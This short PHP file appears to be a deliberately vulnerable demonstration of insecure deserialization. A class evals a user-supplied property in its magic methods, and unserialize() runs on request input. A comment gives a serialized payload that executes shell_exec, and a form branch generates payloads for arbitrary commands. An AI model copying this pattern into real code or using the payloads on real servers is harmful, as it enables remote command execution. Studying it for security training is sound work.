<?php

// exploit: $_REQUEST['r'] = 'O:7:"Command":1:{s:6:"inject";s:26:"echo shell_exec("ls -al");";}';

class Command {
    public $inject;

    public function __construct() {
        echo "[+] Construct function called successfully" . PHP_EOL;
    }

    public function __sleep() {
        if(isset($this->inject))
            eval($this->inject);
    }

    public function __wakeup() {
        if(isset($this->inject))
            eval($this->inject);
    }

    public function __destruct() {
        if(isset($this->inject))
            eval($this->inject);
    }
}

if(isset($_REQUEST['r'])) { // Use serialized cmd...
    $var1=unserialize($_REQUEST['r']);
    if(is_array($var1))
        echo "<br/>".$var1[0]." - ".$var1[1];
}
else if(isset($_POST['command'])) { // Serialization of custom cmd...
    $command = $_POST['command'];
    $cmd = new Command();
    $cmd->inject = "echo shell_exec('$command');";
    $serialized_cmd = serialize($cmd);
    echo "<p>Serialized Command: $serialized_cmd</p>";
}
